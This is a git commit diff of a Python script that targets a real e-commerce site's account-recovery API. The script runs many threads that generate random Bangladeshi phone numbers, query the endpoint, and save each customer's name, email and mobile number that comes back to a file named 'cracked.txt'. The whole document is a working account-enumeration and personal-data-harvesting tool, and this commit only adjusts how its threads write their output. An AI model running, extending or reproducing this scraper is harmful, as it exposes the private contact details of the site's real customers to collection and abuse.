e77eeaec5034333f2d1b8b3a783597d1c762c5a0
sharifulislam141 <masudranadarkwolf@gmail.com>
2023-02-16 11:29:49 +0600

    thread fixed

--- main.py
+++ main.py
@@ -1,36 +1,33 @@
 import requests
 import threading
 from random import randint
-
-th = int(input("Enter Thread: "))
-f = open('cracked.txt', 'a')
-
-lock = threading.Lock()
+ 
+th = int(input("Enter thread: "))
 
 def phoneNumber():
     number = str("01")
-    number1 = str(randint(6,9))
+    number1 =str(randint(6,9))
     number2 = str(randint(10000000,99999999))
     number3 =number + number1 + number2
     return(number3)
 
-def check_account():
+def scrape():
     while True:
         try:
             number = phoneNumber()
             url = "https://api.ajkerdeal.com/recover/accountrecoverylist"
-            values = {"MobileOrEmail": f"{number}", "Type": "2"}
+            values =  {"MobileOrEmail":f"{number}","Type":"2"}
             e_headers = {
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36",
                 "Sec-Ch-Ua-Platform": "Windows",
                 "Origin": "https://ajkerdeal.com",
                 "Sec-Fetch-Site": "same-site",
-                "Sec-Fetch-Mode": "cors",
+                "Sec-Fetch-Mode":"cors",
                 "Sec-Fetch-Dest": "empty",
                 "Referer": "https://ajkerdeal.com/",
                 "Accept-Encoding": "gzip, deflate",
                 "Accept-Language": "en-US,en;q=0.9"
-            }
+            } 
             response = requests.post(url, headers=e_headers, data=values)
             json_data = response.json()
             customer_name = json_data["Data"][0]["CName"]
@@ -39,23 +36,25 @@ def check_account():
             print(f"Name: {customer_name}")
             print(f"Email: {customer_email}")
             print(f"Mobile: {customer_mobile}")
-            with lock:
-                # Write the variables' values to the file
+
+            # Write the variables' values to the file
+            with open('cracked.txt', 'a') as f:
                 f.write(f"Name: {customer_name}\n")
                 f.write(f"Email: {customer_email}\n")
                 f.write(f"Mobile: {customer_mobile}\n")
                 f.write("_______________\n")
-             
+                f.flush()
+
         except Exception as e:
             print(f"Error: {e}")
 
 if __name__ == '__main__':
     threads = []
-    for i in range(th):
-        t = threading.Thread(target=check_account)
+    for i in range(th):  # create 10 threads
+        t = threading.Thread(target=scrape)
         t.start()
         threads.append(t)
-        
+
+    # wait for all threads to complete
     for t in threads:
         t.join()
-    f.close()
